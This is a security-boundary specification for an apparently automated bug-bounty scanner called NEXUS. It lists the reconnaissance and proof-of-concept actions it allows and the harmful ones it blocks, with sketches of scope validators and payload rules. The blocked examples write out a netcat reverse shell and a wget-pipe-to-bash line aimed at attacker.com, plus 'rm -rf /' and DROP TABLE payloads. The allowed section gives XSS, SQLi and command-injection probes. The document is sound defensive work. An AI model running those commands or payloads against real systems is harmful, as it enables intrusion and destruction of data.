# NEXUS FRAMEWORK — SECURITY BOUNDARY

**Purpose:** Define exactly what NEXUS can and cannot do  
**Enforcement:** Code review + permission checks + test coverage  
**Violation:** Any breach = critical build failure

---

## GOLDEN RULE

**DETECTION + POC ONLY**

- Prove vulnerability exists (send payload, capture response)
- Do not harm, modify, or access target data
- No persistence, no backdoors, no extraction

---

## ALLOWED (Detection & Proof)

### Reconnaissance (Read-Only)
```
✅ Enumerate subdomains (subfinder, assetfinder, dnsx, etc.)
✅ Enumerate endpoints (httpx, katana, ffuf, etc.)
✅ Enumerate parameters (arjun, paramminer, kiterunner)
✅ Enumerate tech stack (Wappalyzer, nuclei fingerprinting)
✅ Enumerate IPs/CIDR (reverse DNS, ASN lookup)
✅ Enumerate DNS records (dnsmap, dnsx, dnsenum)
✅ Enumerate certificates (crt.sh, ssl fingerprinting)
✅ Enumerate OSINT sources (Shodan, Censys, SecurityTrails)
✅ Enumerate GitHub (source code dorks, public data)
✅ Enumerate Wayback Machine (historical URLs)
```

**Allowed because:** Information gathering, no modification, publicly available data

### Scanning (Vulnerability Detection)
```
✅ Send payloads to test injection (SQLi, XSS, command injection)
✅ Observe behavior changes (error messages, response times)
✅ Capture proof (response HTML, headers, status codes)
✅ Test bypass techniques (403 bypass, auth bypass)
✅ Detect WAF/CDN (firewall detection)
✅ Detect tech versions (fingerprinting, version disclosure)
✅ Test business logic (IDOR enumeration, rate limits)
✅ Test parameter tampering (modify values, observe behavior)
✅ Test API endpoints (fuzzing, endpoint discovery)
✅ Test file uploads (handling, storage path disclosure)
```

**Allowed because:** Detection only, read-only observation

### Proof of Concept (Minimal Execution)
```
✅ Execute PoC that triggers vulnerability (but extracts nothing)
  Example: XSS payload that alerts(1) — proves execution, no data theft
  
✅ Trigger application logic without side effects
  Example: Rate limit test — identify limit, no account damage
  
✅ Test IDOR by reading own data after ID change
  Example: User 1 can read own /api/profile → change ID to 2, read 2's profile
  → Proves IDOR, no data exfiltration
  
✅ Capture evidence (screenshot, response)
  Example: SQL error message in response — proves SQLi without exploitation
  
✅ Test blind vulnerabilities with callback
  Example: SSRF with interaction — send request to attacker.com, log callback
  → Proves SSRF, no internal data access

✅ Test authentication bypass without account creation
  Example: Try default credentials, test auth bypass logic
  → Proves vulnerability, no persistent changes
```

**Allowed because:** Minimal exploitation, read-only, no data theft, reversible

---

## BLOCKED (Harm / Modification / Persistence)

### Data Extraction & Theft
```
❌ Extract user data (emails, passwords, SSNs, credit cards)
❌ Exfiltrate source code (beyond PoC)
❌ Exfiltrate database (beyond PoC)
❌ Download files without proof necessity
❌ Access internal systems (unless scoped)
❌ Read application config (beyond what needed for PoC)
❌ Access private Git repositories
❌ Extract API tokens/keys (beyond finding they exist)
```

**Blocked because:** Data harm, legal violation, scope breach

### Data Modification & Deletion
```
❌ Modify database records
❌ Delete files
❌ Change application settings
❌ Modify application data
❌ Update configuration files
❌ Create/delete user accounts
❌ Modify user roles/permissions
❌ Change payment information
❌ Modify access controls
```

**Blocked because:** Causes harm, destructive, illegal

### Persistence & Backdoors
```
❌ Plant backdoors / reverse shells
❌ Create cron jobs / scheduled tasks
❌ Modify application code
❌ Inject web shells
❌ Create user accounts
❌ Establish SSH access
❌ Modify SSH keys
❌ Plant malware / rootkits
❌ Leave artifacts behind
```

**Blocked because:** Persistent threat, unauthorized access, criminal liability

### Arbitrary Command Execution
```
❌ Execute arbitrary commands on target
❌ Run scripts on target system
❌ Access target shell
❌ Compile/execute binaries
❌ Download/execute payload
```

**Blocked because:** Unauthorized access, potential for harm

### Resource Provisioning
```
❌ Create databases
❌ Create cloud resources (S3 buckets, VMs, etc.)
❌ Provision infrastructure
❌ Create DNS records
❌ Create email accounts
❌ Allocate storage / bandwidth
```

**Blocked because:** Causes cost, unauthorized provisioning

### Scope Violations
```
❌ Scan out-of-scope targets
❌ Submit out-of-scope findings
❌ Attack third-party services
❌ Access linked services beyond scope
❌ Enumerate related domains (unless explicitly in scope)
```

**Blocked because:** Program rules, legal violation

---

## IMPLEMENTATION REQUIREMENTS

### Code-Level Enforcement

**1. Permission Checks (lib/scope_validator.py)**
```python
def validate_finding_scope(finding, target_config):
    """
    Before any operation: is this finding in scope?
    Blocks submission of OOS findings
    """
    if finding.endpoint not in target_config.in_scope:
        finding.valid = False
        finding.reason = "OUT_OF_SCOPE"
        return False
    return True

def validate_target_scope(target, target_config):
    """
    Before scan starts: is this target in scope?
    """
    if target not in target_config.in_scope:
        raise ScopeException(f"{target} is out of scope")
```

**2. Data Access Restrictions (core/database.py)**
```python
# ALLOWED queries
SELECT endpoint, vuln_type, severity FROM findings WHERE target_id = 1
SELECT COUNT(*) FROM findings WHERE severity = 'P1'

# BLOCKED operations
DELETE FROM findings  # ❌ No deletion
UPDATE targets SET compromised = true  # ❌ No modification
INSERT INTO users VALUES (...)  # ❌ No creation
DROP TABLE targets  # ❌ No structural changes
```

**3. Tool Invocation Restrictions (phases/probe/tool_runners.py)**
```python
# ALLOWED: Read-only reconnaissance
subprocess.run(['nuclei', '-u', target_url, '-t', 'xss.yaml'])
subprocess.run(['dalfox', target_url, 'DFS'])
subprocess.run(['ffuf', '-u', target_url, '-w', 'wordlist.txt'])

# BLOCKED: Any modification
subprocess.run(['rm', '/target/file.txt'])  # ❌ No deletion
subprocess.run(['curl', target_url, '-X', 'POST', '-d', 'DROP TABLE users'])  # ❌ No SQL
subprocess.run(['bash', '-c', 'nc -e /bin/sh attacker.com 4444'])  # ❌ No shell
```

**4. Payload Restrictions (lib/payload_builder.py)**
```python
# ALLOWED: Detection payloads
payload = 'test<img src=x onerror=alert(1)>test'  # XSS detection
payload = "1' AND '1'='1"  # SQLi detection
payload = '$(sleep 5)'  # Command injection detection

# BLOCKED: Exploitation payloads
payload = '"; DROP TABLE users;--'  # ❌ Modifies data
payload = '| wget attacker.com/shell.sh | bash'  # ❌ Executes code
payload = '`rm -rf /`'  # ❌ Destructive
```

**5. Output Restrictions (core/reporter.py)**
```python
# ALLOWED: Findings report (proof only)
- Vulnerable endpoint
- Payload used
- Response snippet (proving vulnerability)
- Screenshot
- Severity + impact

# BLOCKED: Data exfiltration
- Do NOT include extracted passwords
- Do NOT include full database dumps
- Do NOT include source code beyond PoC
- Do NOT include API keys / tokens (unless finding itself)
- Do NOT include user PII (beyond what proves IDOR exists)
```

### Test Coverage Requirements

**Every security boundary must have tests:**

```python
# test_scope_enforcement.py
test_ooss_finding_blocked()  # OOS finding cannot be submitted
test_ooss_target_blocked()  # OOS target cannot be scanned
test_wildcard_scope_enforcement()  # Wildcard respected
test_cloud_scope_validation()  # Cloud resources validated

# test_data_access_restrictions.py
test_delete_blocked()  # Database deletion impossible
test_modification_blocked()  # Data changes blocked
test_creation_blocked()  # New records prevented

# test_payload_restrictions.py
test_destructive_payloads_blocked()  # rm, DROP TABLE blocked
test_shell_payloads_blocked()  # No RCE shells
test_extraction_payloads_blocked()  # No data theft

# test_output_restrictions.py
test_findings_contain_proof_only()  # No sensitive data in report
test_api_keys_not_exported()  # Credentials never in output
test_user_data_not_extracted()  # PII not in findings
```

---

## REAL-WORLD EXAMPLES

### Example 1: XSS in Search

**ALLOWED:**
```
Payload: <img src=x onerror=alert(1)>
Target: paypal.com/search?q=PAYLOAD
Response: <input value="<img src=x onerror=alert(1)>">
PoC: alert(1) executes in browser
Report: "Stored XSS detected, proof: screenshot shows alert box"
```

**BLOCKED:**
```
Extracting: Cookies from victim user
Stealing: Session tokens
Modifying: Search results
Creating: Hidden admin account
Harvesting: User data from search results
```

---

### Example 2: SQLi in Filter

**ALLOWED:**
```
Payload: 1' AND SLEEP(5)--
Target: paypal.com/filter?id=PAYLOAD
Response: Page takes 5+ seconds (slow query = SQLi confirmed)
PoC: Time-based SQLi detection
Report: "SQLi confirmed via time-based detection"
```

**BLOCKED:**
```
Extracting: SELECT * FROM users
Dumping: Database structure
Modifying: UPDATE users SET role='admin'
Deleting: DELETE FROM transactions
Inserting: INSERT INTO admins VALUES (...)
```

---

### Example 3: IDOR in API

**ALLOWED:**
```
Endpoint: /api/users/123/profile (own user)
Response: {"id":123, "email":"user@example.com"}
Test: Change 123 to 456 (different user)
Response: {"id":456, "email":"other@example.com"}
PoC: IDOR confirmed (can read other user's email)
Report: "IDOR in /api/users/{id}/profile, can enumerate all user emails"
```

**BLOCKED:**
```
Modifying: Change other user's email
Deleting: Delete other user's account
Extracting: All 1M user emails to file
Creating: New account in their name
Resetting: Their password
Stealing: Payment information
```

---

### Example 4: 403 Bypass

**ALLOWED:**
```
Endpoint: /admin (403 Forbidden)
Test: Try bypass headers (X-Forwarded-For, X-Original-URL, etc.)
Response: GET /admin with X-Original-URL: /admin → 200 OK
PoC: Bypass technique works, admin panel accessible
Report: "403 bypass possible via X-Original-URL header"
```

**BLOCKED:**
```
Modifying: Admin settings
Deleting: User accounts from admin panel
Creating: New admin account
Extracting: Admin credentials
Modifying: Access controls
Viewing: Sensitive internal data (unless screenshot needed)
```

---

## SCOPE VIOLATIONS TO BLOCK

### Case 1: In-Scope vs Out-of-Scope

```yaml
Target: paypal.com
In-Scope:
  - paypal.com
  - api.paypal.com
  - *.api.paypal.com
  
Out-of-Scope:
  - blog.paypal.com
  - shop.paypal.com
```

**ALLOWED:**
```
✅ Scan paypal.com (in-scope)
✅ Scan api.paypal.com (in-scope)
✅ Scan api1.api.paypal.com (matches *.api.paypal.com)
```

**BLOCKED:**
```
❌ Scan blog.paypal.com (explicit OOS)
❌ Submit findings from shop.paypal.com
❌ Access related domains not in scope
```

### Case 2: VDP vs BB

```yaml
Program 1: VDP (no bounty)
Program 2: BB (paid bounty, higher risk allowed)
```

**VDP (RESTRICTED):**
```
✅ Light scan only (quick-scan default)
❌ No heavy tools (sqlmap, commix)
❌ No auth testing (limited scope)
```

**BB (UNRESTRICTED):**
```
✅ Full scan allowed (--full-scan)
✅ All tools enabled
✅ Auth testing, deep enumeration allowed
```

---

## ENFORCEMENT CHECKLIST

**Before build completes:**

- [ ] Scope validator blocks OOS findings
- [ ] Database CRUD restricted (no delete/modify)
- [ ] Tool runners only execute read-only tools
- [ ] Payloads restricted (no destructive commands)
- [ ] Output restricted (no sensitive data)
- [ ] All security tests pass (100%)
- [ ] Code review confirms no bypasses
- [ ] No hardcoded commands
- [ ] No shell execution (shell=False always)
- [ ] No subprocess wildcards

---

## FAILURE SCENARIOS

**If any of these happen, build fails:**

1. ❌ OOS finding submitted → CRITICAL FAILURE
2. ❌ Database modified by scanning → CRITICAL FAILURE
3. ❌ RCE payload executed → CRITICAL FAILURE
4. ❌ Data extracted beyond PoC → CRITICAL FAILURE
5. ❌ Scope bypass possible → CRITICAL FAILURE
6. ❌ Test coverage < 100% on security → CRITICAL FAILURE

---

**Status: SECURITY BOUNDARY DEFINED**

**Agent must enforce all rules in code + tests**
